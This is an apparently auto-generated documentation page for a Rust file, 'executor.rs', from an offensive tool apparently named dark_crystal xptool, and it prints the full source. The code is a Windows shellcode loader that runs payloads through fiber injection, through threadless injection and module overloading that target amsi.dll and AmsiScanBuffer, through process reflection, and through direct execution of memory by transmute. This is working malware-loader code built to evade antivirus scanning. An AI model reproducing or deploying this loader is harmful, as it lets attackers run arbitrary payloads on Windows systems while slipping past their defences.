# executor

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/tools/xptool/src/executor.rs` |
| **Lines** | 148 |
| **Cards** | T022-architecture |
| **Role** | XP tool executor |
| **Unsafe blocks** | 4 |

## Types

### struct `Executor` (line 11)

## Public API

### `new` (line 17)
```rust
pub fn new(method: ExecMethod, debug: bool) -> Self
```

### `execute` (line 21)
```rust
pub fn execute(&self, shellcode: &[u8]) -> Result<()>
```

## Internal Functions

- `execute_fiber` (line 31)
- `execute_threadless` (line 56)
- `execute_process_reflection` (line 79)
- `execute_module_overload` (line 100)
- `execute_direct` (line 122)
- `fiber_proc` (unsafe) (line 145)

## Key Dependencies

- `use anyhow::{anyhow, Result};`
- `use windows::Win32::System::Threading::{`
- `use crate::config::ExecMethod;`
- `use crate::shellcode::ShellcodeBuffer;`

## Full Source

```rust
use anyhow::{anyhow, Result};
use std::ffi::c_void;

use windows::Win32::System::Threading::{
    ConvertThreadToFiber, CreateFiber, DeleteFiber, SwitchToFiber,
};

use crate::config::ExecMethod;
use crate::shellcode::ShellcodeBuffer;

pub struct Executor {
    method: ExecMethod,
    debug: bool,
}

impl Executor {
    pub fn new(method: ExecMethod, debug: bool) -> Self {
        Self { method, debug }
    }

    pub fn execute(&self, shellcode: &[u8]) -> Result<()> {
        match self.method {
            ExecMethod::Fiber => self.execute_fiber(shellcode),
            ExecMethod::Threadless => self.execute_threadless(shellcode),
            ExecMethod::ProcessReflection => self.execute_process_reflection(shellcode),
            ExecMethod::ModuleOverload => self.execute_module_overload(shellcode),
            ExecMethod::Direct => self.execute_direct(shellcode),
        }
    }

    fn execute_fiber(&self, shellcode: &[u8]) -> Result<()> {
        if self.debug {
            println!("[*] Ejecutando via Fiber injection...");
        }

        if shellcode.is_empty() {
            return Err(anyhow!("Shellcode vacio para fiber injection"));
        }

        unsafe {
            let main_fiber = ConvertThreadToFiber(None);
            let payload_fiber = CreateFiber(0, Some(fiber_proc), Some(shellcode.as_ptr() as *const c_void));

            if payload_fiber.is_null() {
                return Err(anyhow!("CreateFiber fallo"));
            }

            SwitchToFiber(payload_fiber);
            SwitchToFiber(main_fiber);
            DeleteFiber(payload_fiber);
        }

        Ok(())
    }

    fn execute_threadless(&self, shellcode: &[u8]) -> Result<()> {
        if self.debug {
            println!("[*] Ejecutando via Threadless injection...");
        }

        if shellcode.is_empty() {
            return Err(anyhow!("Shellcode vacio para threadless injection"));
        }

        unsafe {
            let h_process = windows::Win32::System::Threading::GetCurrentProcess();
            let export = "AmsiScanBuffer";

            if !crystalclearlib::injection::threadless::try_threadless_inject(
                h_process, "amsi.dll", export, shellcode,
            ) {
                return Err(anyhow!("Threadless injection fallo"));
            }
        }

        Ok(())
    }

    fn execute_process_reflection(&self, shellcode: &[u8]) -> Result<()> {
        if self.debug {
            println!("[*] Ejecutando via Process Reflection...");
        }

        if shellcode.is_empty() {
            return Err(anyhow!("Shellcode vacio para process reflection"));
        }

        unsafe {
            let pid = windows::Win32::System::Threading::GetCurrentProcessId();
            if !crystalclearlib::injection::process_reflection::try_process_reflection(
                pid, shellcode,
            ) {
                return Err(anyhow!("Process reflection fallo"));
            }
        }

        Ok(())
    }

    fn execute_module_overload(&self, shellcode: &[u8]) -> Result<()> {
        if self.debug {
            println!("[*] Ejecutando via Module Overloading...");
        }

        if shellcode.is_empty() {
            return Err(anyhow!("Shellcode vacio para module overloading"));
        }

        let target_dll = "C:\\Windows\\System32\\amsi.dll";
        let module = crystalclearlib::loader::module_overload::Module::new(
            shellcode.to_vec(),
            "".to_string(),
            target_dll.to_string(),
        )
        .map_err(|e| anyhow!("Module::new failed: {:?}", e))?;

        module
            .run()
            .map_err(|e| anyhow!("Module::run failed: {:?}", e))
    }

    fn execute_direct(&self, shellcode: &[u8]) -> Result<()> {
        if self.debug {
            println!("[*] Ejecutando shellcode directamente...");
        }

        let buffer = ShellcodeBuffer::new(shellcode)?;

        if self.debug {
            println!(
                "[*] Shellcode en memoria: {:?} ({} bytes)",
                buffer.ptr(),
                buffer.size()
            );
        }

        let shellcode_fn: extern "system" fn() = unsafe { std::mem::transmute(buffer.ptr()) };

        shellcode_fn();

        Ok(())
    }
}

unsafe extern "system" fn fiber_proc(param: *mut c_void) {
    let shellcode_fn: extern "system" fn() = std::mem::transmute(param);
    shellcode_fn();
}

```